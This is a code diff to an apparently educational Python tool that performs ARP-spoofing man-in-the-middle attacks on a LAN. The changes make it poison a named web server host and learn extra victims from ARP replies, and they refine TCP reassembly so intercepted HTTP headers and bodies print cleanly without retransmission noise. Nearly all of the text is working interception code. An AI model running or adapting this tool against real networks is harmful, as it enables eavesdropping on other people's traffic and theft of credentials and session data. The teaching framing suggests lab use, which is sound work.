@@ -16,7 +16,7 @@ What it teaches
        gateway -> "target is at <attacker MAC>"
    Extra LAN hosts (e.g. a web server on :5000) are poisoned as well, either
    because they are listed in EXTRA_UPSTREAMS or because we learn them from
-   the target's own ARP requests.
+   the target's own ARP requests/replies.
 3. Relay every frame addressed to us at layer 2, so nothing breaks.
    IPv4 *and* IPv6 are relayed.
 4. Reassemble TCP streams and print complete HTTP headers + bodies.
@@ -63,8 +63,9 @@ GATEWAY_MAC = None            # None -> resolve with ARP
 
 # Web server is a separate host on the same LAN?  Put its IP here.
 # Leave empty if the server is the gateway or this machine.
-#   e.g. EXTRA_UPSTREAMS = ["10.110.233.100"]
-EXTRA_UPSTREAMS = []
+# Same-subnet hosts are NOT routed through the gateway, so they must be
+# poisoned explicitly (or learned live from the target's ARP requests).
+EXTRA_UPSTREAMS = ["10.110.233.36"]
 
 ATTACKER_MAC = None           # None -> read from IFACE
 
@@ -387,6 +388,12 @@ class HttpReassembler:
         return key in self.streams
 
     def feed(self, key, seq: int, data: bytes):
+        """
+        Add a TCP segment.  Returns:
+            None        -> pure retransmission, nothing new to show
+            []          -> new bytes buffered but no complete message yet
+            [messages]  -> one or more complete HTTP messages
+        """
         state = self.streams.get(key)
         if state is None:
             state = [seq, bytearray()]
@@ -399,7 +406,7 @@ class HttpReassembler:
         elif seq < next_seq:
             overlap = next_seq - seq
             if overlap >= len(data):
-                return []                       # pure retransmission
+                return None                     # pure retransmission
             buf.extend(data[overlap:])
             state[0] = next_seq + len(data) - overlap
         else:
@@ -540,15 +547,21 @@ def handle_ipv4(frame: bytes, direction: str,
         if sport is None or not ({sport, dport} & FILTER_PORTS):
             return False
 
-    print("\n[%s] %-22s %s  (%d bytes)"
-          % (time.strftime("%H:%M:%S"), direction, label, len(data)))
-
     candidates = http_ports()
     http_flow = (proto == 6 and
                  (assembler.has(key) or sport in candidates
                   or dport in candidates or is_http_start(data)))
+
+    messages = None
     if http_flow:
         messages = assembler.feed(key, seq, data)
+        if messages is None:
+            return False                              # pure retransmission
+
+    print("\n[%s] %-22s %s  (%d bytes)"
+          % (time.strftime("%H:%M:%S"), direction, label, len(data)))
+
+    if http_flow:
         if messages:
             for kind, head, body, content_length in messages:
                 print_http(kind, head, body, content_length)
@@ -575,21 +588,22 @@ def learn_from_arp(frame: bytes, poison_set: PoisonSet, own_ip: str,
     """
     if len(frame) < 42:
         return
-    if struct.unpack("!H", frame[20:22])[0] != ARP_REQUEST:
+    oper = struct.unpack("!H", frame[20:22])[0]
+    if oper not in (ARP_REQUEST, ARP_REPLY):
         return
     sender_mac = frame[22:28]
     sender_ip = socket.inet_ntoa(frame[28:32])
-    requested = socket.inet_ntoa(frame[38:42])
+    peer_ip = socket.inet_ntoa(frame[38:42])   # "who has X?" / requester of reply
 
     if sender_mac != target_mac and sender_ip != target_ip:
         return
-    if requested in ("0.0.0.0", "255.255.255.255", target_ip):
+    if peer_ip in ("0.0.0.0", "255.255.255.255", target_ip):
         return
-    if requested in own_ips:
+    if peer_ip in own_ips:
         return
-    if not same_subnet(requested, own_ip, own_mask):
+    if not same_subnet(peer_ip, own_ip, own_mask):
         return
-    poison_set.learn(requested)
+    poison_set.learn(peer_ip)
 
 
 def run_relay(sock, ifname, attacker_mac, target_ip, target_mac, gateway_mac,
